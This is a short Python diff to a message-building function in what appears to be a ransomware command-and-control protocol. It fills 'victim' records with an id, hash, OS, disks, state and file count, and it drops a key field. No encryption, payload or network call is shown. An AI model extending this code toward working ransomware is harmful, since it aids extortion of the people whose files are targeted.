@@ -36,18 +36,20 @@ def set_message(select_msg, params=None):
         return LIST_VICTIM_REQ
 
     if select_msg.upper() == 'LIST_VICTIM_RESP':
-        # dans les param il va inserer une liste [..,..,..] donc la premiere position ça doit etre la
-        LIST_VICTIM_RESP['OS'] = params[0]
+        if len(params) != 6:
+            return None
+        LIST_VICTIM_RESP['VICTIM'] = params[0]  # id
         LIST_VICTIM_RESP['HASH'] = params[1]
-        LIST_VICTIM_RESP['DISKS'] = params[2]
-        LIST_VICTIM_RESP['KEY'] = params[3]
+        LIST_VICTIM_RESP['OS'] = params[2]
+        LIST_VICTIM_RESP['DISKS'] = params[3]
+        LIST_VICTIM_RESP['STATE'] = params[4]
+        LIST_VICTIM_RESP['NB_FILES'] = params[5]
         return LIST_VICTIM_RESP
 
     if select_msg.upper() == 'LIST_VICTIM_END':
         return LIST_VICTIM_END
 
     if select_msg.upper() == 'HISTORY_REQ':
-        HISTORY_REQ['HIST_REQ'] = params[0]
         return HISTORY_REQ
 
     if select_msg.upper() == 'HISTORY_RESP':
